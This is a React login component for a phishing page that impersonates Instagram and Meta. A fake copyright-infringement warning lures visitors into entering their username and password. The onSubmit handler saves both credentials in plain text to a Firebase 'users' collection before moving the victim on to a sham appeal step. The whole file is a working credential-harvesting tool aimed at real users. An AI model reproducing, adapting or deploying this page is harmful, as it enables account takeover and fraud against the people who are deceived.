import React, { useState } from 'react'
import './Login.css'
import instagram from '../assets/instagram.png'
import meta from '../assets/meta.png'
import db from '../features/firebase'
import { addDoc,  collection } from "firebase/firestore";


function Login({Appealpage, setAppealpage, handleAppeal}) {
    const [passwordShow, setpasswordShow] = useState(true);
    const [Username, setUsername] = useState("")
    const [Password, setPassword] = useState("")
    console.log(Username, Password)

    const handlePassword =()=>{
        setpasswordShow(!passwordShow)
    }

    const onSubmit= async (e) => {
      e.preventDefault();
      const docRef = await addDoc(collection(db, "users"), {
        username:Username,
        password:Password
      });
      console.log(Username,Password)
      handleAppeal()
  
    };

    return (
        <div>
                  <div className='relative  h-full '>
          <div className='flex  justify-between items-center px-3 p-2 bg-gradient-to-l   from-black via-mid to-Base'>
            <div className='flex flex-col items-start text-white text-sm'>
              <h1 className='font-medium'>Instagram</h1>
              <p className='text-[0.7rem]'>Get Instagram from Google Play Or App Store</p>
            </div>
            <button className='text-white text-sm border p-[0.1rem] border-white border-opacity-40 px-2'>GET</button>
          </div>
          <div className='px-3'>
          <div className='flex justify-center items-center p-6 pb-6'>
            <img className='h-16' src={instagram}></img>
          </div>
          <form onSubmit={onSubmit} className='text-sm space-y-8'>
                <h1 className='text-lg font-bold'>Copyright Infringement Detected in Your Account</h1>
                <div className='px-4 text-[0.9rem] font-medium text-gray-500'>
                <p>Hello</p>
                <p>As instagram, we remove accounts that violate our copyright laws</p>
                <p>Continue by entering your username to learn about and appeal to copyright Infringement related to your account</p>
                </div>
                <div className='px-10 flex flex-col items-center justify-center space-y-6'>
                    <div className='space-y-4 w-full rounded-sm'>
                <input className='border w-full outline-none p-1 text-sm' value={Username} onChange={(e)=>{setUsername(e.target.value)}} type="text" id="userName" name="userName" placeholder='@username'></input>
                <div className='flex border p-1 items-center rounded-sm'>
                <input className=' w-full outline-none  text-sm' value={Password} onChange={(e)=>{setPassword(e.target.value)}} type={passwordShow?'text':'password'} id="password" name="password"placeholder='password'></input>
                    <p onClick={handlePassword} className='px-2 font-medium'>{passwordShow ? 'Hide':'Show'}</p>
                </div>

                </div>
                <button type="submit" className='text-white text-base rounded-sm bg-myblue py-1 w-full'>Next</button>
                </div>

            </form>

            <div className=' flex flex-col  bottom-0 items-center justify-center p-1 pt-14 '>
              <p className='text-sm'>From</p>
              <img className='w-20' src={meta}></img>
              </div>    
              </div></div>

            
        </div>
    )
}

export default Login
